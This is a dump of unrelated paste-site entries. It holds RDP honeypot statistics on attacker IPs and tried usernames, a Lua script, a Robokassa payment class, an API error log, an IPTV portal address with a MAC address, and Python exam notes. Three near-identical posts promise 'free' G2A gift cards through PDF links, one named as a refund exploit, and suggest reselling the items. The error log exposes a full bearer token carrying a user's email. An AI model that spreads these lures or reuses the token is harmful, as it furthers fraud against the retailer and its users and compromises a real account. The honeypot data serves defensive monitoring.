id,title,username,language,date,content
EFjFHTmN,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:16:09 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 8,
    ""68.183.102.140"": 2,
    ""179.60.147.135"": 2,
    ""45.227.254.26"": 8,
    ""58.218.204.183"": 6,
    ""87.251.75.145"": 8,
    ""205.210.31.52"": 6,
    ""194.165.16.37"": 4,
    ""71.6.135.131"": 2,
    ""128.199.73.121"": 376,
    ""87.251.75.64"": 2,
    ""80.66.88.215"": 2,
    ""62.204.41.123"": 12,
    ""103.240.6.155"": 6,
    ""212.70.149.142"": 6,
    ""80.66.76.92"": 6,
    ""185.170.144.3"": 4,
    ""167.71.171.237"": 2,
    ""198.235.24.88"": 6,
    ""5.8.10.202"": 4,
    ""120.240.145.8"": 2,
    ""194.165.16.11"": 4,
    ""152.32.199.33"": 2,
    ""104.248.120.201"": 8,
    ""173.230.147.247"": 2,
    ""205.210.31.161"": 6,
    ""43.226.39.53"": 2552,
    ""185.180.143.8"": 2,
    ""103.77.209.24"": 6,
    ""103.72.57.134"": 6,
    ""118.193.56.171"": 2,
    ""205.210.31.169"": 6,
    ""167.248.133.50"": 2,
    ""45.227.254.48"": 4
  },
  ""asn"": {
    ""AS14061"": 396,
    ""AS209588"": 2,
    ""AS267784"": 12,
    ""AS4134"": 6,
    ""AS208091"": 18,
    ""AS396982"": 24,
    ""AS48721"": 8,
    ""AS10439"": 2,
    ""AS59425"": 12,
    ""AS151853"": 6,
    ""AS204428"": 6,
    ""AS197414"": 4,
    ""AS34665"": 4,
    ""AS56040"": 2,
    ""AS135377"": 4,
    ""AS63949"": 2,
    ""AS134762"": 2552,
    ""AS211680"": 2,
    ""AS150897"": 6,
    ""AS150892"": 6,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 396,
    ""Flyservers S.A."": 22,
    ""Chinanet"": 6,
    ""Xhost Internet Solutions LP"": 20,
    ""Google LLC"": 24,
    ""CariNet, Inc."": 2,
    ""Xhost Internet Solutions"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""SS-Net"": 6,
    ""Petersburg Internet Network ltd"": 4,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""CHINANET Liaoning province Dalian MAN network"": 2552,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 396,
    ""Cloud Solutions S.A"": 2,
    ""UAB Host Baltic"": 12,
    ""Chinanet JS"": 6,
    ""Xhost Internet Solutions"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 8,
    ""CariNet, Inc."": 2,
    ""XHOSTIS"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""4Media Ltd"": 6,
    ""Xhostis"": 4,
    ""PIN DC"": 4,
    ""China Mobile"": 2,
    ""Ucloud Information Technology (hk) Limited"": 4,
    ""Linode"": 2,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 2552,
    ""ICG 1 Inap"": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""California"": 36,
    ""New Jersey"": 12,
    ""Distrito Federal"": 2,
    ""Vilnius"": 12,
    ""Jiangsu"": 6,
    ""North Holland"": 20,
    ""Kaunas"": 8,
    ""South West"": 376,
    ""Drenthe"": 2,
    ""Moscow"": 12,
    ""Ho Chi Minh"": 12,
    ""Plovdiv"": 6,
    ""St.-Petersburg"": 4,
    ""Guangdong"": 2554,
    ""Sao Paulo"": 2,
    ""Illinois"": 2,
    ""\u00ecnh \u0110\u1ecbnh Province"": 6,
    ""Bangkok"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""United States"": 52,
    ""Venezuela"": 2,
    ""Lithuania"": 20,
    ""China"": 2560,
    ""The Netherlands"": 22,
    ""Singapore"": 376,
    ""Russia"": 16,
    ""Vietnam"": 18,
    ""Bulgaria"": 6,
    ""Brazil"": 2,
    ""Thailand"": 2
  },
  ""account"": {
    ""w63prjqz"": 8,
    ""beio"": 4,
    ""Administr"": 30,
    ""Test"": 28,
    ""hello"": 24,
    ""PEpwDPiRn"": 2,
    ""HNsRje"": 2,
    ""rijVSr"": 2,
    ""root"": 2,
    ""Administrator"": 98,
    ""Admin"": 94,
    ""Whatuptime.com"": 94,
    ""Jakartakini123#"": 94,
    ""BezEuJR"": 2,
    ""OuSShzXWF"": 2,
    ""wgwlll"": 2,
    ""ZgHhAE"": 2,
    ""(empty)"": 8,
    ""Domain"": 4,
    ""5444kna1"": 8,
    ""IcNXJdVkd"": 2,
    ""WqyynP"": 2,
    ""lITtpY"": 2,
    ""NCRACK_USER"": 2552,
    ""6fr5moe1"": 2,
    ""mRagpMaAJ"": 2,
    ""qhDJGk"": 2,
    ""PCvtYS"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3076
  },
  ""client_build"": {
    ""Unknown"": 3076
  },
  ""client_name"": {
    ""Unknown"": 3076
  },
  ""ip_type"": {
    ""hosting & proxy"": 10,
    ""Unknown"": 2646,
    ""hosting"": 418,
    ""mobile"": 2
  }
}"
yCMEC583,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 4,
    ""68.183.102.140"": 1,
    ""179.60.147.135"": 1,
    ""45.227.254.26"": 4,
    ""58.218.204.183"": 3,
    ""87.251.75.145"": 4,
    ""205.210.31.52"": 3,
    ""194.165.16.37"": 2,
    ""71.6.135.131"": 1,
    ""128.199.73.121"": 188,
    ""87.251.75.64"": 1,
    ""80.66.88.215"": 1,
    ""62.204.41.123"": 6,
    ""103.240.6.155"": 3,
    ""212.70.149.142"": 3,
    ""80.66.76.92"": 3,
    ""185.170.144.3"": 2,
    ""167.71.171.237"": 1,
    ""198.235.24.88"": 3,
    ""5.8.10.202"": 2,
    ""120.240.145.8"": 1,
    ""194.165.16.11"": 2,
    ""152.32.199.33"": 1,
    ""104.248.120.201"": 4,
    ""173.230.147.247"": 1,
    ""205.210.31.161"": 3,
    ""43.226.39.53"": 1276,
    ""185.180.143.8"": 1,
    ""103.77.209.24"": 3,
    ""103.72.57.134"": 3,
    ""118.193.56.171"": 1,
    ""205.210.31.169"": 3,
    ""167.248.133.50"": 1,
    ""45.227.254.48"": 2
  },
  ""asn"": {
    ""AS14061"": 198,
    ""AS209588"": 1,
    ""AS267784"": 6,
    ""AS4134"": 3,
    ""AS208091"": 9,
    ""AS396982"": 12,
    ""AS48721"": 4,
    ""AS10439"": 1,
    ""AS59425"": 6,
    ""AS151853"": 3,
    ""AS204428"": 3,
    ""AS197414"": 2,
    ""AS34665"": 2,
    ""AS56040"": 1,
    ""AS135377"": 2,
    ""AS63949"": 1,
    ""AS134762"": 1276,
    ""AS211680"": 1,
    ""AS150897"": 3,
    ""AS150892"": 3,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 198,
    ""Flyservers S.A."": 11,
    ""Chinanet"": 3,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 12,
    ""CariNet, Inc."": 1,
    ""Xhost Internet Solutions"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""SS-Net"": 3,
    ""Petersburg Internet Network ltd"": 2,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""CHINANET Liaoning province Dalian MAN network"": 1276,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 198,
    ""Cloud Solutions S.A"": 1,
    ""UAB Host Baltic"": 6,
    ""Chinanet JS"": 3,
    ""Xhost Internet Solutions"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 4,
    ""CariNet, Inc."": 1,
    ""XHOSTIS"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""4Media Ltd"": 3,
    ""Xhostis"": 2,
    ""PIN DC"": 2,
    ""China Mobile"": 1,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Linode"": 1,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 1276,
    ""ICG 1 Inap"": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""California"": 18,
    ""New Jersey"": 6,
    ""Distrito Federal"": 1,
    ""Vilnius"": 6,
    ""Jiangsu"": 3,
    ""North Holland"": 10,
    ""Kaunas"": 4,
    ""South West"": 188,
    ""Drenthe"": 1,
    ""Moscow"": 6,
    ""Ho Chi Minh"": 6,
    ""Plovdiv"": 3,
    ""St.-Petersburg"": 2,
    ""Guangdong"": 1277,
    ""Sao Paulo"": 1,
    ""Illinois"": 1,
    ""\u00ecnh \u0110\u1ecbnh Province"": 3,
    ""Bangkok"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""United States"": 26,
    ""Venezuela"": 1,
    ""Lithuania"": 10,
    ""China"": 1280,
    ""The Netherlands"": 11,
    ""Singapore"": 188,
    ""Russia"": 8,
    ""Vietnam"": 9,
    ""Bulgaria"": 3,
    ""Brazil"": 1,
    ""Thailand"": 1
  },
  ""account"": {
    ""w63prjqz"": 4,
    ""beio"": 2,
    ""Administr"": 15,
    ""Test"": 14,
    ""hello"": 12,
    ""PEpwDPiRn"": 1,
    ""HNsRje"": 1,
    ""rijVSr"": 1,
    ""root"": 1,
    ""Administrator"": 49,
    ""Admin"": 47,
    ""Whatuptime.com"": 47,
    ""Jakartakini123#"": 47,
    ""BezEuJR"": 1,
    ""OuSShzXWF"": 1,
    ""wgwlll"": 1,
    ""ZgHhAE"": 1,
    ""(empty)"": 4,
    ""Domain"": 2,
    ""5444kna1"": 4,
    ""IcNXJdVkd"": 1,
    ""WqyynP"": 1,
    ""lITtpY"": 1,
    ""NCRACK_USER"": 1276,
    ""6fr5moe1"": 1,
    ""mRagpMaAJ"": 1,
    ""qhDJGk"": 1,
    ""PCvtYS"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1538
  },
  ""client_build"": {
    ""Unknown"": 1538
  },
  ""client_name"": {
    ""Unknown"": 1538
  },
  ""ip_type"": {
    ""hosting & proxy"": 5,
    ""Unknown"": 1323,
    ""hosting"": 209,
    ""mobile"": 1
  }
}"
en2aNMzY,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Saturday 16th of March 2024 07:09:25 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
17 March 2024















































"
rf5zLc9V,chunkloader,Zeehao,Lua,Saturday 16th of March 2024 07:06:23 PM CDT,"local component = require(""component"")
local event = require(""event"")

os.execute(""clear"")

local cl = component.chunkerloader
cl.setActive(true)
while event.pull(1, ""interrupted"")  == nil do 
    print(""Is Active: "" .. tostring(cl.isActive())
    if cl.isActive() == false then
        os.execute(""reboot"")
    end
end"
2yV3KSbH,🤑 G2A.com Free Gift Card Guide Mar 2024 🤑,ssss50w,GetText,Saturday 16th of March 2024 06:18:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=bbac6a4c-491e-4d6d-9e1e-906db1161a87
 
Working as of:
16 March 2024











































"
3ZqhbFCE,Untitled,arbora,TypeScript,Saturday 16th of March 2024 06:13:46 PM CDT,"import { createHash } from 'crypto'
import axios from 'axios'
import { ICreateRoboxCheckoutRequest } from '@luaroxa/contracts'
import RoboxWebhook from './robox.webhook.dto'

type RoboxConfig = {
  shopIdentifier: string
  password1: string
  password2: string
  testMode: boolean
}

export default class Robokaska {
  private shopIdentifier: string
  private password1: string
  private password2: string
  private testMode: boolean

  constructor(config: RoboxConfig) {
    const { shopIdentifier, password1, password2, testMode = false } = config

    this.shopIdentifier = shopIdentifier
    this.password1 = password1
    this.password2 = password2
    this.testMode = testMode
  }

  md5(input: string) {
    return createHash('md5').update(input).digest('hex')
  }

  async createPayUrl(dto: ICreateRoboxCheckoutRequest): Promise<{
    id: string
    url: string
  }> {
    const InvId = ''

    const signature = this.md5(
      `${this.shopIdentifier}:${dto.amount}:${InvId}:${this.password1}:Shp_id=${dto.checkoutId}`,
    )

    const payload = {
      MerchantLogin: this.shopIdentifier,
      OutSum: dto.amount.toString(),
      InvId,
      Shp_id: dto.checkoutId,
      SignatureValue: signature,
    }

    const url = 'https://auth.robokassa.ru/Merchant/Indexjson.aspx?'

    const response = await axios.post(
      url,
      new URLSearchParams(payload).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      },
    )
    console.log('response.data', response.data)
    if (response.data.error) {
      throw new Error(JSON.stringify(response.data.error))
    }
    return {
      id: response.data.invoiceID,
      url: `https://auth.robokassa.ru/Merchant/Index/${response.data.invoiceID}`,
    }
  }

  checkPay(dto: RoboxWebhook) {
    // const sigSrc = `${Math.round(parseInt(dto.OutSum))}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}::${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}`
    const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    const sig = this.md5(sigSrc)

    console.debug('checkPay', dto)
    console.debug('checkPay to md5', sigSrc)
    console.debug('checkPay: compare', dto.SignatureValue.toUpperCase(), sig)

    return dto.SignatureValue.toUpperCase() === sig.toUpperCase()
  }
}
"
ypWgU7c2,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Saturday 16th of March 2024 06:12:32 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_600217.pdf

Working as of:
16 March 2024"
4zYA4dJG,Error on setting change,iko1133,JSON,Saturday 16th of March 2024 05:50:57 PM CDT,"{
	""config"": {
		""adapter"": [""xhr"", ""http""],
		""baseURL"": ""https://devheyeyapi.azurewebsites.net/api/"",
		""data"": ""{\""settingId\"":1,\""value\"":\""false\""}"",
		""env"": {
			""Blob"": [Function Blob],
			""FormData"": [Function FormData]
		},
		""headers"": [Object],
		""maxBodyLength"": -1,
		""maxContentLength"": -1,
		""method"": ""put"",
		""timeout"": 0,
		""transformRequest"": [
			[Function transformRequest]
		],
		""transformResponse"": [
			[Function transformResponse]
		],
		""transitional"": {
			""clarifyTimeoutError"": false,
			""forcedJSONParsing"": true,
			""silentJSONParsing"": true
		},
		""url"": ""users/10/settings/1"",
		""validateStatus"": [Function validateStatus],
		""xsrfCookieName"": ""XSRF-TOKEN"",
		""xsrfHeaderName"": ""X-XSRF-TOKEN""
	},
	""data"": {
		""Message"": ""The property 'UserSetting.UserId' is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke 'SaveChanges', and then associate the dependent with the new principal."",
		""StatusCode"": 500
	},
	""headers"": {
		""cache-control"": ""no-cache,no-store"",
		""content-type"": ""application/json"",
		""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
		""expires"": ""-1"",
		""pragma"": ""no-cache"",
		""server"": ""Microsoft-IIS/10.0"",
		""x-powered-by"": ""ASP.NET""
	},
	""request"": {
		""DONE"": 4,
		""HEADERS_RECEIVED"": 2,
		""LOADING"": 3,
		""OPENED"": 1,
		""UNSENT"": 0,
		""_aborted"": false,
		""_cachedResponse"": undefined,
		""_hasError"": false,
		""_headers"": {
			""accept"": ""application/json"",
			""authorization"": ""Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImViYzIwNzkzNTQ1NzExODNkNzFjZWJlZDI5YzU1YmVmMjdhZDJjY2IiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGV2aGV5ZXkiLCJhdWQiOiJkZXZoZXlleSIsImF1dGhfdGltZSI6MTcwOTkwODU1NiwidXNlcl9pZCI6IldLQUpreFQwV0tkQkdlZmRFU3F4NTdQNVNmYjIiLCJzdWIiOiJXS0FKa3hUMFdLZEJHZWZkRVNxeDU3UDVTZmIyIiwiaWF0IjoxNzEwNjI1MDQ2LCJleHAiOjE3MTA2Mjg2NDYsImVtYWlsIjoiZGVtbzIwQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJkZW1vMjBAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.N75rCFV3RXistg6yaxAf4Tb4WFpj93vUE1gVvZmr5MKRdOkZ-LoRbQm0OhDq1FPpXAQ8QqdpnOpTZfyrHQlm3gmY4UeXxYsLFyo6M4w9ToMMH1idRdS80ESJWlkstUmhOb3xDgKtC1HL5PrLqWdpgYY90CTGhHy7reaxrmxHJvRov1IUIXm3hqY7ziPDALbm6WOJSARYtF_IyOy1edylfDLAH_rkYjqNNc6dpziKsOtyF7-gaelnRTvgqRxdSBbl7W2tTYhhyhIVOV-zD-2bfoX_pOYRPVJnrGpYwnai5fgyoWQ1QVpLfkOKWnB7ZmI5p7ETZ9bmdk9LdwkZ33EWmQ"",
			""content-type"": ""application/json-patch+json"",
			""x-requested-with"": ""XMLHttpRequest""
		},
		""_incrementalEvents"": false,
		""_lowerCaseResponseHeaders"": {
			""cache-control"": ""no-cache,no-store"",
			""content-type"": ""application/json"",
			""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""expires"": ""-1"",
			""pragma"": ""no-cache"",
			""server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""_method"": ""PUT"",
		""_perfKey"": ""network_XMLHttpRequest_https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""_performanceLogger"": {
			""_closed"": false,
			""_extras"": [Object],
			""_pointExtras"": [Object],
			""_points"": [Object],
			""_timespans"": [Object]
		},
		""_requestId"": null,
		""_response"": ""{\""StatusCode\"":500,\""Message\"":\""The property \\u0027UserSetting.UserId\\u0027 is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke \\u0027SaveChanges\\u0027, and then associate the dependent with the new principal.\""}"",
		""_responseType"": """",
		""_sent"": true,
		""_subscriptions"": [],
		""_timedOut"": false,
		""_trackingName"": ""unknown"",
		""_url"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""readyState"": 4,
		""responseHeaders"": {
			""Cache-Control"": ""no-cache,no-store"",
			""Content-Type"": ""application/json"",
			""Date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""Expires"": ""-1"",
			""Pragma"": ""no-cache"",
			""Server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""responseURL"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""status"": 500,
		""timeout"": 0,
		""upload"": {},
		""withCredentials"": true
	},
	""status"": 500,
	""statusText"": undefined
}"
Ca17NVqG,PORTAL-FLIXTVON,brunoflix,XML,Saturday 16th of March 2024 05:44:29 PM CDT,"portal""http://4u.eagle4u.org:8080/""
00:1A:79:03:1E:30"
u1jAnUjB,webinar-exam-review-v4-2023-03-16,jspill,Python,Saturday 16th of March 2024 05:19:06 PM CDT,"# Exam Review 2024 Mar 16

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
# get to know the Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# When you've gotten the Ch 33-34 Prac Tests to 100, go back and do each again.
# This time, try to think of 2-3 more unit tests that could be run on each question.

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Operators
# = # assignment
# == # asking a question
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division?""
# // # floor division... last even division
# <
# >
# <=
# >=
# += # x += 1 --> x = x+1
# -=
# ** # pow(), math.pow()
# !=
# # keywords
# in # membership check... if x in myList:
# not # if not x in myList:
# and
# or # any one True would cause the combo is True... limit OR to 2-3 conditions

# Data Types/Classes
# int
# float
# bool
# str # """"
# list # [ ]
# dict # {key: value}, review Ch 4.5
# tuple # ( ) immutable, Python sees x,y,z as (x,y,z) -> return a,b,c --> return (a,b,c)
# set # {x,y,z} no duplicates, no order --> no indices, can't slice it, can't sort it, can't reverse it
# range # range()... container of consecutive numbers
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements... if, if/else, if/elif, if/elif/else
# LOOPS
# WHILE - a general purpose loop, an IF that repeats
# FOR - repeating action once for everything in a container
# FOR - repeating actions a known number of times -> once for everything in a container
# Check out my For Loops webinar in The Gotchas
# for ___ in _someContainer_:
# for item in myList:
# for char in myStr:
# for key in myDict: # value for that key in myDict[key]
# for n in range(5):
# for i in range(0, len(myList)):
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling it
# modular... a function has ONE job
# output/print vs return (or maybe something)
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
#
# def someFunction(x, y):
#     return x ** y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# final ""task"" page of Ch 10, 11, 13, 14
# CodingBat also has good function-based Python questions:
# https://codingbat.com/python

# BUILT-IN FUNCTIONS
# input()
# print()
# range()
# pow()
# type() # print(type(myVar).__name__)
# list()
# str()
# int()
# float()
# len()
# sum()
# min()
# max()
# enumerate()
# open()
# round() # cousins math.ceil(), math.floor()
# abs() # math.fabs(), ""magnitude""
# help()
# dir() # # print(dir(str))
# help(str) # help(str.isspace)

# STRINGS
# be able to refer to indices, and slice
# myStr = ""abcdef""
# # mySlice[start:stop:step]
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
# "" "" # space from spacebar
# # a lot of Unicode spaces
# ""\n"" # new line return
# ""\t"" # tab
# ""\r"" # carriage return

# myVar = input().strip()

# unless otherwise stated... printed output should end a new line return... 99% of the time it does anyway
# print(""hey"") # --> print(""hey"", end=""\n"")
# we only need to change that when...
#1 ... this specific says to do something else
#2 ... you yourself overrode the end parameter of print() as the last thing you did... just call print() after that block

# STRING METHODS
# myStr.format() # ""Stuff I want to put this {} and {} together in a string"".format(val1, val2)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # ""remove"" myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # return index location
# myStr.count(subStr) # returns number of times it's there
# case: lower(), upper(), title(), capitalize()
# is/Boolean: isspace(), isupper(), islower(), isalpha(), isnumeric(), isdigit(), isalnum()
# myStr.startswith(subStr), endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# # -
# myList.pop(i) # last one or by index
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item) # returns int count of item
# myList.copy()
# myList.index(item)

# DICT
# use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key
# myDict[key] = value # assigns new value to key
#
# # DICT METHODS
# myDict.keys() # all dict keys in a set-like object
# myDict.values() # all dict values in a set-like object

# check if key in dict
# if ___ in myDict: # checking the keys

# MODULES
# math and csv

# MATH MODULE
# import math # FULL IMPORT
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y)
# math.fabs(x)
# math.pi
# math.e
#
# # PARTIAL IMPORT
# from math import ceil # just ceil(), no math.
# from math import factorial, sqrt # factorial(), sqrt()
# from math import * # floor(), sqrt()
#
# # ALIAS IMPORT
# import math as m
# m.floor(), m.ceil()

# FILES
# modes: r, w, a

# READ MODE
# filename = input()
with open(""test.txt"", ""r"") as f:
    # f.read()  # returns whole file as one big string
    # f.readline() # singular! I stay away from this one
    # f.readlines()  # returns a list of strings, line by line
    # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
    contents = f.readlines()
# print(contents)
# for line in contents:
#     line = line.strip()
#     print(line)

# CSV module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    # contents = f1.readlines()
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"")

# print(contents)

# WRITE MODE
# with open(""output_data35.csv"", ""w"") as f2:
#     # write out a file from contents where emails are from Yahoo
#     for row in contents:
#         # email is row[3]
#         if row[3].endswith(""@yahoo.com""):
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")

"
